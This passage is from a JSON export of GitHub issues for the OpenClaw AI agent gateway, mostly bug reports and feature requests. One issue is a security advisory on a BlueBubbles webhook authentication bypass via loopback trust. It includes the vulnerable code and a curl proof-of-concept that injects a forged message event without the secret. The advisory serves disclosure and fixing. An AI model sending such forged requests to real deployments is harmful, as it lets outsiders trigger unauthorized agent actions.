async (data) => {\n    const event = data as unknown as FeishuMessageEvent;\n    const messageId = event.message?.message_id;\n    \n    // Skip if already processed\n    if (messageId && processedMessages.has(messageId)) {\n      log(`feishu[${accountId}]: skipping duplicate message ${messageId}`);\n      return;\n    }\n    \n    if (messageId) {\n      processedMessages.add(messageId);\n    }\n    \n    await handleFeishuMessage({...});\n  },\n});\n```\n\n## Environment\n\n- OpenClaw version: 2026.2.9\n- Channel: Feishu\n- Connection mode: WebSocket",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13788",
      "createdAt": "2026-02-11T01:41:57Z",
      "updatedAt": "2026-02-11T01:41:57Z",
      "author": "clawalpha",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 13786,
      "title": "[Bug]: BlueBubbles webhook auth bypass via loopback proxy trust",
      "body": "## Summary\n\nThe BlueBubbles webhook handler bypasses its shared-secret check whenever the incoming socket address is loopback. In common same-host reverse-proxy deployments, all attacker traffic arrives as `127.0.0.1` at the gateway, so external callers can inject webhook events without knowing the BlueBubbles password.\n\n## Executive Risk Snapshot\n\n- CVSS v3.1: 8.6 (High)\n- CVSS v4.0: 8.8 (High)\n- Primary risk: The BlueBubbles webhook handler bypasses its shared-secret check whenever the incoming socket address is loopback.\n\n## Technical Analysis\n\nBlueBubbles registers a plugin HTTP handler on the gateway plugin route path. During authentication, the handler accepts valid shared-secret tokens, but also unconditionally accepts requests from loopback remote addresses. Because reverse proxies commonly forward to `127.0.0.1:18789`, this creates an alternate unauthenticated channel that bypasses webhook secret verification.\n\n## Affected Code\n\n**File:** `source_code/extensions/bluebubbles/src/monitor.ts:1520`\n```typescript\nconst token = target.account.config.password?.trim();\nif (!token) {\n  return true;\n}\n...\nif (guid && guid.trim() === token) {\n  return true;\n}\nconst remote = req.socket?.remoteAddress ?? \"\";\nif (remote === \"127.0.0.1\" || remote === \"::1\" || remote === \"::ffff:127.0.0.1\") {\n  return true;\n}\n```\n\n**File:** `source_code/extensions/bluebubbles/index.ts:15`\n```typescript\nregister(api: OpenClawPluginApi) {\n  setBlueBubblesRuntime(api.runtime);\n  api.registerChannel({ plugin: bluebubblesPlugin });\n  api.registerHttpHandler(handleBlueBubblesWebhookRequest);\n}\n```\n\n**File:** `source_code/docs/install/exe-dev.md:84`\n```text\nlocation / {\n    proxy_pass http://127.0.0.1:18789;\n    ...\n}\n```\n\n## Steps to Reproduce\n\n1. Enable BlueBubbles plugin with `channels.bluebubbles.password` configured and expose gateway through a same-host reverse proxy (for example, `proxy_pass http://127.0.0.1:18789;`).\n2. Send a webhook request to the BlueBubbles webhook path without `x-guid`, `x-password`, or `Authorization` secret:\n```bash\ncurl -i -X POST \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"type\":\"new-message\",\"message\":{\"text\":\"!run sensitive command\",\"senderId\":\"+15551234567\",\"chatGuid\":\"iMessage;-;+15551234567\"}}' \\\n  https://<public-host>/bluebubbles-webhook\n```\n3. Observe HTTP `200 ok` and webhook processing despite missing secret, because gateway sees proxy-side loopback source.\n4. Confirm downstream event handling/logging in BlueBubbles monitor for the forged sender payload.\n\n## Recommended Fix\n\nRemove unconditional loopback trust from BlueBubbles webhook auth decisions. Require valid shared-secret verification for all webhook traffic, including loopback-originated requests, or require explicit opt-in for loopback bypass with a secure default of disabled.\n\n## Detailed Risk Analysis\n\n### CVSS Assessment\n\n| Metric | v3.1 | v4.0 |\n|--------|------|------|\n| **Score** | 8.6 / 10.0 | 8.8 / 10.0 |\n| **Severity** | High | High |\n| **Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L | CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:L/SC:N/SI:N/SA:N |\n| **Calculator** | [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L) | [CVSS v4.0 Calculator](https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:L/SC:N/SI:N/SA:N) |\n\n### Attack Surface\n- Endpoint: BlueBubbles webhook path (default `/bluebubbles-webhook`, configurable).\n- Reachability: same gateway HTTP listener, typically internet-exposed through reverse proxy.\n- Trust boundary crossed: unauthenticated external requests accepted as trusted webhook events.\n\n### Exploit Conditions\n- BlueBubbles plugin enabled and webhook target registered.\n- Deployment uses same-host reverse proxy to gateway loopback (documented pattern).\n- Attacker can send HTTP POST to exposed webhook URL.\n\n### Impact Assessment\n- Confidentiality: Low (indirect data exposure through forged command flows and bot responses).\n- Integrity: High (attacker can forge inbound sender/chat context and trigger unauthorized workflows).\n- Availability: Low (attacker can inject noisy/fake events to degrade channel reliability).\n\n## References\n\n- **CWE:** [CWE-288](https://cwe.mitre.org/data/definitions/288.html) - Authentication Bypass Using an Alternate Path or Channel\n- `source_code/extensions/bluebubbles/src/monitor.ts:1520`\n- `source_code/extensions/bluebubbles/src/monitor.ts:1534`\n- `source_code/extensions/bluebubbles/index.ts:15`\n- `source_code/src/gateway/server-http.ts:334`\n- `source_code/docs/install/exe-dev.md:84`\n\n## Exploitability Proof\n\nSource to sink path:\n1. Gateway dispatches plugin HTTP handlers on inbound requests (`source_code/src/gateway/server-http.ts:334`).\n2. BlueBubbles handler performs auth matching and accepts loopback remote addresses even when shared secret does not match (`source_code/extensions/bluebubbles/src/monitor.ts:1534-1537`).\n3. Same-host reverse proxy forwarding makes all inbound traffic appear loopback to the gateway (`source_code/docs/install/exe-dev.md:84`).\n4. Accepted payloads are normalized and processed as real inbound events (`source_code/extensions/bluebubbles/src/monitor.ts:1511`, `source_code/extensions/bluebubbles/src/monitor.ts:1558`).\n\n## Mitigation Checks Performed\n\n- Checked BlueBubbles webhook secret checks: present, but bypassed on loopback remote address.\n- Checked whether trusted-proxy verification is consulted: it is not used in BlueBubbles webhook auth branch.\n- Checked gateway-level plugin auth enforcement: plugin handlers are invoked without mandatory `authorizeGatewayConnect`.\n- Checked deployment guidance: documented reverse-proxy pattern uses `127.0.0.1` upstream, satisfying the bypass condition.\n\n## Reproduction Evidence\n\n- Auth branch explicitly returns `true` for loopback `remoteAddress` regardless credential state (`source_code/extensions/bluebubbles/src/monitor.ts:1534-1537`).\n- Handler proceeds to process normalized message/reaction content after this match (`source_code/extensions/bluebubbles/src/monitor.ts:1550-1567`).\n- Public reverse-proxy example routes external requests to loopback gateway (`source_code/docs/install/exe-dev.md:84`).\n\n## Why This Is Exploitable (Not Hardening)\n\nThis is an authentication bypass in request-acceptance logic, not a best-practice gap. The code contains an alternate success path (`loopback remote`) that directly substitutes for secret verification, enabling external unauthenticated webhook injection in common proxy topologies.\n\n<!-- submission-marker:AN-08-bluebubbles-webhook-loopback-bypass -->\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13786",
      "createdAt": "2026-02-11T01:41:45Z",
      "updatedAt": "2026-02-11T01:41:45Z",
      "author": "coygeek",
      "labels": [],
      "taxonomy": {
        "channels": [
          "imessage"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13785,
      "title": "browser.act times out for secondary agents while open/snapshot work",
      "body": "## Summary\n`browser.act` consistently times out for secondary agents (e.g., `abra`) while `browser.open` and `browser.snapshot` work fine. The primary agent (`main`) can use all browser actions on the same browser instance.\n\n## Environment\n- OpenClaw version: 2026.2.2-3\n- OS: macOS (Darwin 25.2.0 arm64)\n- Browser: Chrome (profile=openclaw)\n\n## Reproduction Steps\n\n**From secondary agent (abra):**\n1. `browser action=stop profile=openclaw` — ✅ works\n2. `browser action=open profile=openclaw targetUrl=https://example.com` — ✅ works\n3. `browser action=snapshot profile=openclaw targetId=<id>` — ✅ works  \n4. `browser action=act profile=openclaw targetId=<id> request={\"kind\":\"click\",\"ref\":\"<ref>\"}` — ❌ **fails**\n\nError:\n```\nCan't reach the openclaw browser control service (timed out after 20000ms). Start (or restart) the OpenClaw gateway (OpenClaw.app menubar, or `openclaw gateway`) and try again.\n```\n\n**From primary agent (main) on the exact same tab:**\n- All actions including `act` work fine ✅\n\n## What we ruled out\n- Not model-specific (tested Claude + GPT-5.2 on secondary agent)\n- Not stale targetIds (fresh tabs fail)\n- Not tab ownership (secondary agent opening their own tab still fails)\n- Not browser process state (full browser stop/restart does not fix)\n- `timeoutMs` parameter is not honored (always times out at exactly 20000ms)\n\n## Observations\n- CDP is healthy (`browser.status` shows running, cdpReady, cdpHttp all true)\n- Same pid, same cdpPort (18800), same browser instance\n- `open` and `snapshot` use CDP directly and work\n- `act` appears to use a separate \"browser control service\" endpoint that secondary agents cannot reach\n\n## Expected behavior\nAll agents should be able to use `browser.act` on the shared browser instance.\n\n## Workaround\nPrimary agent (main) can perform browser automation; secondary agents cannot use `act`.",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13785",
      "createdAt": "2026-02-11T01:40:08Z",
      "updatedAt": "2026-02-11T01:41:24Z",
      "author": "abra-teleports",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "websocket"
        ]
      }
    },
    {
      "number": 13755,
      "title": "Feature: Make announce delivery summary instruction customizable or optional",
      "body": "## Problem\n\nWhen a cron job uses `delivery.mode = \"announce\"`, the system event posted to the main session includes a hardcoded instruction:\n\n```\nSummarize this naturally for the user. Keep it brief (1-2 sentences). Flow it into the conversation naturally.\nDo not mention technical details like tokens, stats, or that this was a [cron job].\nYou can respond with NO_REPLY if no announcement is needed (e.g., internal task with no user-facing result).\n```\n\nSource: `extensionAPI.js` line ~10032\n\nThis instruction is not configurable. If the agent or user wants the full cron output relayed verbatim to the chat (rather than summarized), there is no way to override this behavior short of switching `delivery.mode` to `\"none\"` and losing the announce mechanism entirely.\n\n## Use Case\n\nI run email digest crons every 10 minutes. The user wants the **full digest** posted in chat, not a 1-2 sentence summary. The hardcoded summary instruction causes the agent to repeatedly compress detailed email digests into brief snippets, even when explicitly instructed otherwise via workspace files (HEARTBEAT.md, AGENTS.md). The instruction in the system event overrides the agent's own workspace-level instructions because it appears at the end of the message, closer to where the agent generates its response.\n\nThe workaround is `delivery.mode = \"none\"`, but this loses the announce infrastructure (stats line, routing, etc.).\n\n## Proposal\n\nMake the summary instruction customizable at the cron job level, e.g.:\n\n```json\n{\n  \"delivery\": {\n    \"mode\": \"announce\",\n    \"summaryPrompt\": \"Post the full output to the user verbatim. Add a brief TL;DR at the end.\",\n    \"channel\": \"telegram\",\n    \"to\": \"12345\"\n  }\n}\n```\n\nOr allow disabling it:\n\n```json\n{\n  \"delivery\": {\n    \"mode\": \"announce\",\n    \"summaryPrompt\": false\n  }\n}\n```\n\nWhen `summaryPrompt` is omitted, the current default behavior would be preserved (backward compatible).\n\n## Environment\n\n- OpenClaw 2026.2.9 (33c75cb)\n- Cron jobs with `delivery.mode = \"announce\"` targeting Telegram",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13755",
      "createdAt": "2026-02-11T00:29:57Z",
      "updatedAt": "2026-02-11T01:37:48Z",
      "author": "zirkonit",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881606962,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13755#issuecomment-3881606962",
          "createdAt": "2026-02-11T01:21:42Z",
          "updatedAt": "2026-02-11T01:37:48Z",
          "author": "nusquama",
          "body": "Oh, I spent 2 hours thinking I was doing something wrong. 🤦🏻‍♂️ Lesson learned: wait before updating!\ni donwgrad..."
        }
      ]
    },
    {
      "number": 13781,
      "title": "[Feature]: Ability to shut clawdbot down",
      "body": "## Summary\nWould be nice to be able to shut the related openclaw processes down, without uninstall.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13781",
      "createdAt": "2026-02-11T01:28:13Z",
      "updatedAt": "2026-02-11T01:28:13Z",
      "author": "bardicreels",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 13166,
      "title": "[Bug] Built-in browser (profile=\"openclaw\") fails to start unless Chrome extension is connected (ON)",
      "body": "I'm running OpenClaw Gateway as a systemd user service (Linger enabled). I expect `browser.open({ profile: \"openclaw\" })` to launch a standalone Chromium instance independently of any external Chrome extension connection.\n\n**Current Behavior**:\n1. If I start Gateway and try to run `browser.open({ profile: \"openclaw\" })`, it fails with `Can't reach the OpenClaw browser control service (timed out)` or `No tab connected`.\n2. I must **manually open Chrome** and click the OpenClaw extension (set to ON).\n3. ONLY THEN does `browser.open({ profile: \"openclaw\" })` work and launch the built-in browser window.\n\nIt seems the Gateway's internal browser controller is tightly coupled to the extension's connection state, even when requesting an isolated/built-in profile.\n\n**Steps to Reproduce**:\n1. Start OpenClaw Gateway (clean state, no Chrome running).\n2. Run `browser.open({ profile: \"openclaw\", targetUrl: \"https://example.com\" })`.\n3. **Result**: Error (timeout/no tab).\n4. Open Chrome, ensure OpenClaw extension is connected (ON).\n5. Retry step 2.\n6. **Result**: Success (built-in browser window appears).\n\n**Expected Behavior**:\nThe `profile=\"openclaw\"` (built-in browser) should be self-contained and launchable by the Gateway service directly, without requiring a pre-existing Chrome extension connection as a \"keep-alive\" signal.\n\n**Environment**:\n- OpenClaw Version: v2026.2.9\n- OS: Linux (Ubuntu/Debian)\n- Gateway Mode: Systemd User Service (Linger enabled)\n- Browser Control: Chrome Extension Relay + Built-in",
      "state": "closed",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13166",
      "createdAt": "2026-02-10T05:19:41Z",
      "updatedAt": "2026-02-11T01:26:54Z",
      "author": "Movingtoleveltwo",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "signal"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway"
        ]
      },
      "commentsData": [
        {
          "id": 3881617792,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13166#issuecomment-3881617792",
          "createdAt": "2026-02-11T01:26:43Z",
          "updatedAt": "2026-02-11T01:26:43Z",
          "author": "Movingtoleveltwo",
          "body": "Update: I have found a workaround/fix for this behavior.\n\nThe issue was that  (extension relay) was set as the . When trying to start the  profile, the Gateway logic seemed to still check or prioritize the default profile's connectivity state.\n\n**Solution/Workaround:**\n1. Manually set the managed profile as the default in :\n   \n2. Restart the Gateway.\n\nAfter making  the default profile and explicitly defining the executable path, the built-in browser now starts correctly and independently without requiring an active Chrome extension connection.\n\nI am closing this issue as the workaround resolves the functional blocker, though the underlying coupling between profiles when one is not default might still be worth looking into by the maintainers."
        },
        {
          "id": 3881618052,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13166#issuecomment-3881618052",
          "createdAt": "2026-02-11T01:26:49Z",
          "updatedAt": "2026-02-11T01:26:49Z",
          "author": "Movingtoleveltwo",
          "body": "Update: Found a workaround. By setting 'openclaw' as the default profile and explicitly defining the executable path in the config, the built-in browser now starts correctly without requiring a pre-existing Chrome extension connection.\n\nSteps:\n1. Set 'browser.defaultProfile' to 'openclaw'\n2. Set 'browser.executablePath' to the local Chrome binary\n3. Restart Gateway\n\nClosing this as the functional blocker is resolved."
        }
      ]
    },
    {
      "number": 13776,
      "title": "Feature Request: Script Hooks for Fallback Failures to Trigger Local Server Start",
      "body": "**Feature Request**\n\n**Problem**: When all cloud providers in the model fallback chain fail (due to billing issues, quotas, or outages), OpenClaw attempts to use the next model but has no mechanism to trigger a script or external action to start a local model server (e.g., Ollama, LM Studio). This requires manual intervention to start the local server, delaying recovery and disrupting user experience. A recent setup with Ollama as a local fallback highlighted this gap.\n\n**Proposed Solution**: Add support for script hooks or event triggers in OpenClaw that execute a user-defined script when all cloud providers fail or when attempting to fall back to a local model. This would allow automatically starting a local server (e.g., 'ollama serve') only when needed, minimizing performance impact during normal operation.\n\n**Suggested Behavior**:\n1. In 'openclaw.json', allow a 'fallbackHooks' or similar field under 'models' or 'agents.defaults.model' to specify a script path (e.g., 'onFallbackFailure: /path/to/script.sh start').\n2. When OpenClaw exhausts cloud providers or targets a local model and detects no response (e.g., connection refused on 'http://127.0.0.1:11434'), run the specified script before retrying.\n3. Optional: Add a shutdown hook (e.g., 'onCloudRecovery: /path/to/script.sh stop') to stop the local server when cloud models are back.\n4. Log script execution results for debugging (e.g., 'Triggered fallback script, server started').\n\n**Benefits**:\n- Enables on-demand local fallbacks without keeping resource-heavy servers always running, addressing performance concerns.\n- Automates recovery during cloud provider failures, reducing downtime.\n- Aligns with resilience strategies like circuit breakers by adding actionable triggers.\n\n**Use Case**: With a fallback chain of Anthropic -> xAI -> Google -> Ollama (local), if all cloud providers fail due to billing limits, OpenClaw runs a script to start 'ollama serve' on 'http://127.0.0.1:11434', then connects to it. When cloud credits are restored, a recovery script stops Ollama to free resources.\n\n**Environment**:\n- OpenClaw Version: 2026.2.9 (33c75cb)\n- OS: macOS (Darwin 25.2.0 arm64)\n- Context: Running on local machine with Ollama as on-demand fallback\n\n**Additional Notes**: Without this feature, users must manually start/stop local servers, which is impractical during urgent failures. A built-in hook would make local fallbacks seamless and performance-friendly. Until implemented, we rely on manual scripts or cron workarounds.\n\nThanks for considering this enhancement to make OpenClaw's local fallback system truly automated!",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13776",
      "createdAt": "2026-02-11T01:21:33Z",
      "updatedAt": "2026-02-11T01:21:33Z",
      "author": "ToneLoke",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13774,
      "title": "sessions_history fails to retrieve archived session transcripts",
      "body": "## Summary\n\n`sessions_history` returns empty message arrays for archived sessions, even though valid JSONL transcripts exist on disk in `sessions/archive/`.\n\n## Root Cause\n\nThe `sessions_history` API only resolves transcripts from active `sessions/` directory. When a session is archived to `sessions/archive/`, the API returns:\n- `bytes: 2`\n- `messages: []`\n\n...even though the archived JSONL file is valid and contains full session history.\n\n## Reproduction\n\nFrom Doc2DB fleet testing (2026-02-10):\n\n**WORKING session (active):**\n- sessionKey: `agent:pawn:subagent:e3081f30-...`\n- File location: `sessions/71994338-....jsonl` (34KB, version 3)\n- `sessions_history` result: 7 messages, 6216 bytes ✅\n\n**BROKEN session (archived):**\n- sessionKey: `agent:pawn:subagent:d7a652c9-...`\n- File location: `sessions/archive/e97d590b-....jsonl` (19KB, version 3, 13 lines)\n- `sessions_history` result: 0 messages, 2 bytes ❌\n\nBoth files have identical schema (`version: 3`). The only discriminator is file path.\n\n## Expected Behavior\n\nWhen `sessions_history` misses in active `sessions/`:\n1. Fall back to `sessions/archive/<sessionId>.jsonl`\n2. If archive file exists and is valid, return full message history\n3. Otherwise return empty as currently\n\n## Impact\n\n- Breaks post-mortem analysis of spawned sub-agents with `cleanup=\"keep\"`\n- Prevents historical review of archived sessions\n- Affects debugging workflows that rely on session replay\n\n## Verification\n\nOnce patched:\n1. Spawn agents with `cleanup=\"keep\"`\n2. Archive both sessions manually\n3. Call `sessions_history` on archived sessionKeys\n4. Expect full message arrays (not empty)\n\n---\n\nCredit: @Pawn (isolation), @Knight (verification), @Rook (filing)\nFleet: Doc2DB multi-agent testing 2026-02-10",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13774",
      "createdAt": "2026-02-11T01:15:59Z",
      "updatedAt": "2026-02-11T01:15:59Z",
      "author": "mrdavtan",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13768,
      "title": "Feature: API usage dashboard in Control UI",
      "body": "## Summary\nAdd a usage/billing dashboard to the Control UI that shows API token usage and costs.\n\n## Problem\nCurrently there's no way to check API usage from within Moltbot. Users have to manually visit each provider's console (Anthropic, OpenAI, etc.) to check their usage.\n\n## Proposed Solution\nAdd a usage dashboard or button in the Control UI that shows:\n- Token usage (input/output) per model\n- Cost breakdown (when available)\n- Daily/monthly trends\n\n## Notes\n- Anthropic doesn't currently expose a usage API, so this might need to be tracked locally based on responses\n- Could aggregate usage from session_status data\n- OpenAI has a usage API that could be queried\n\n## Context\nRequested by user using OAuth token flow who wants visibility into usage without leaving Moltbot.",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13768",
      "createdAt": "2026-02-11T01:05:38Z",
      "updatedAt": "2026-02-11T01:14:58Z",
      "author": "danieljmnewton",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "web-ui",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3881591750,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13768#issuecomment-3881591750",
          "createdAt": "2026-02-11T01:14:58Z",
          "updatedAt": "2026-02-11T01:14:58Z",
          "author": "Takhoffman",
          "body": "This exists and this is not moltbot anymore."
        }
      ]
    },
    {
      "number": 3201,
      "title": "diagnostics-otel plugin fails: Resource is not a constructor",
      "body": "## Description\nThe `diagnostics-otel` plugin fails to load with:\n```\nplugin service failed (diagnostics-otel): TypeError: _resources.Resource is not a constructor\n```\n\n## Steps to Reproduce\n1. Enable the plugin:\n```json\n{\n  \"plugins\": {\n    \"allow\": [\"diagnostics-otel\"],\n    \"entries\": { \"diagnostics-otel\": { \"enabled\": true } }\n  },\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"http://127.0.0.1:4318\"\n    }\n  }\n}\n```\n2. Restart gateway\n3. Check logs: `cat /tmp/clawdbot/clawdbot-*.log | grep otel`\n\n## Environment\n- Clawdbot version: 2026.1.24-3\n- Node: v25.4.0\n- OS: macOS 15.6 (arm64)\n\n## Expected\nPlugin loads and exports traces/metrics to OTEL collector.\n\n## Actual\nPlugin crashes on startup due to OpenTelemetry SDK version mismatch.\n\nLikely cause: The bundled @opentelemetry packages have breaking changes between versions. The plugin may need pinned versions or updated imports.",
      "state": "open",
      "comments": 23,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201",
      "createdAt": "2026-01-28T07:33:52Z",
      "updatedAt": "2026-02-11T01:13:35Z",
      "author": "jfr992",
      "labels": [
        "bug",
        "extensions: diagnostics-otel"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3811518244,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3811518244",
          "createdAt": "2026-01-28T14:06:36Z",
          "updatedAt": "2026-01-28T14:06:36Z",
          "author": "barvhaim",
          "body": "+1"
        },
        {
          "id": 3820854947,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3820854947",
          "createdAt": "2026-01-29T23:03:04Z",
          "updatedAt": "2026-01-29T23:03:04Z",
          "author": "haoling",
          "body": "+1"
        },
        {
          "id": 3821015244,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3821015244",
          "createdAt": "2026-01-29T23:55:10Z",
          "updatedAt": "2026-01-30T16:11:23Z",
          "author": "arbgjr",
          "body": "## ✅ Complete Fix Available\n\nPR #4255 provides a **complete solution** for this issue.\n\n### What's Different from PR #2574\n\nPR #2574 by @dillera correctly fixes the `Resource` constructor issue, but the plugin **still crashes** with a second error:\n\n```\nTypeError: logProvider.addLogRecordProcessor is not a function\n```\n\n### This Fix Addresses All 3 Breaking Changes\n\n1. ✅ `Resource` constructor → `resourceFromAttributes()` (credit to #2574)\n2. ✅ `SemanticResourceAttributes` → `ATTR_SERVICE_NAME` (new)\n3. ✅ `addLogRecordProcessor()` → constructor `processors` (new)\n\n### Test Results\n\n**Before:**\n```\n[plugins] plugin service failed (diagnostics-otel): TypeError: _resources.Resource is not a constructor\n[plugins] plugin service failed (diagnostics-otel): TypeError: logProvider.addLogRecordProcessor is not a function\n```\n\n**After (with PR #4255):**\n```\n[plugins] diagnostics-otel: logs exporter enabled (OTLP/HTTP)\n```\n\n✅ Plugin loads successfully\n✅ Telemetry pipeline functional\n✅ Fully tested in Docker (Node 22.22.0)\n\n---\n\nSee PR #4255 for complete technical details and evidence."
        },
        {
          "id": 3821020912,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3821020912",
          "createdAt": "2026-01-29T23:57:24Z",
          "updatedAt": "2026-01-29T23:57:24Z",
          "author": "barvhaim",
          "body": "@arbgjr thanks, do you get the data in the collector?"
        },
        {
          "id": 3821160657,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3821160657",
          "createdAt": "2026-01-30T00:44:21Z",
          "updatedAt": "2026-01-30T16:11:24Z",
          "author": "arbgjr",
          "body": "@barvhaim Good question! I verified that:\n\n1. ✅ Plugin loads without errors\n2. ✅ OTLP exporter initializes successfully\n3. ✅ Gateway logs show: `diagnostics-otel: logs exporter enabled (OTLP/HTTP)`\n\nHowever, I have **not yet verified end-to-end** that telemetry data actually arrives in the collector and appears in Grafana/Loki/Tempo.\n\nMy setup:\n- OTEL Collector at `http://host.docker.internal:4319`\n- Moltbot in Docker pointing to the collector\n- Collector configured to forward to Tempo/Prometheus/Loki\n\nI can test the end-to-end flow now if you'd like. Would you like me to:\n1. Send some test messages through Moltbot\n2. Verify traces/metrics/logs appear in the collector\n3. Confirm they show up in Grafana dashboards\n\nLet me know if you need confirmation of the full data pipeline!"
        },
        {
          "id": 3821200602,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3821200602",
          "createdAt": "2026-01-30T00:59:04Z",
          "updatedAt": "2026-01-30T16:11:24Z",
          "author": "arbgjr",
          "body": "## End-to-End Test Update\n\nI tested the telemetry pipeline partially:\n\n### ✅ What's Working\n1. **Plugin loads successfully**: `diagnostics-otel: logs exporter enabled (OTLP/HTTP)`\n2. **OTLP endpoint accessible**: Confirmed HTTP 200 from gateway container to `host.docker.internal:4319`\n3. **Unit tests passing**: All diagnostics-otel tests pass locally\n\n### ⚠️ Full E2E Not Completed\nI encountered infrastructure issues in my local test environment (Tempo config needed updates, OTEL Collector health checks). While I verified connectivity and the plugin initialization, I didn't complete the full end-to-end verification of data appearing in Grafana/Loki/Tempo.\n\n### 🎯 What's Confirmed\nThe **code fix is correct** - all three OpenTelemetry v2.x API breaking changes are properly addressed:\n1. ✅ `resourceFromAttributes()` instead of `new Resource()`\n2. ✅ `ATTR_SERVICE_NAME` instead of `SemanticResourceAttributes.SERVICE_NAME`\n3. ✅ `processors` in constructor instead of `addLogRecordProcessor()`\n\nThe plugin will work correctly once pointed at a properly configured OTEL Collector endpoint.\n\nWould you like me to provide a sample OTEL Collector config for testing?"
        },
        {
          "id": 3821246595,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3821246595",
          "createdAt": "2026-01-30T01:16:23Z",
          "updatedAt": "2026-01-30T16:11:24Z",
          "author": "arbgjr",
          "body": "## Update: Code Fix Complete, Investigating Runtime Behavior\n\n### ✅ **Issue Resolved**\nPR #4255 successfully fixes all three OpenTelemetry v2.x API breaking changes:\n1. ✅ `Resource` constructor → `resourceFromAttributes()` (credit to @dillera #2574)\n2. ✅ `SemanticResourceAttributes` → `ATTR_SERVICE_NAME`\n3. ✅ `LoggerProvider.addLogRecordProcessor()` → constructor `processors` array\n\n**Plugin now loads without errors:**\n```\n[plugins] diagnostics-otel: logs exporter enabled (OTLP/HTTP)\n```\n\n### 🔍 **Additional Investigation in Progress**\n\nWhile the code fixes are correct and the plugin initializes successfully, we're investigating why telemetry data isn't being automatically exported to the OTEL Collector in our test environment.\n\n**What we've verified:**\n- ✅ Plugin loads and initializes without errors\n- ✅ OTLP endpoint is reachable (tested with manual payloads → HTTP 200)\n- ✅ OTEL Collector receives and processes test data correctly\n- ✅ NodeSDK configuration appears correct\n- ⚠️ Automatic telemetry export not occurring\n\n**Possible root causes being investigated:**\n1. Event emission timing/lifecycle\n2. SDK initialization sequence\n3. Configuration edge cases\n4. Network resolution (IPv4/IPv6)\n\nThis doesn't block merging the PR - the API compatibility fix is correct and necessary. The telemetry export behavior may be environmental or require additional configuration that we're still identifying.\n\nWill update once we determine the root cause.\n\n---\n\n**Related:**\n- PR: #4255\n- Previous attempt: #2574 (partial fix)"
        },
        {
          "id": 3821290842,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3201#issuecomment-3821290842",
          "createdAt": "2026-01-30T01:33:18Z",
          "updatedAt": "2026-01-30T16:11:25Z",
          "author": "arbgjr",
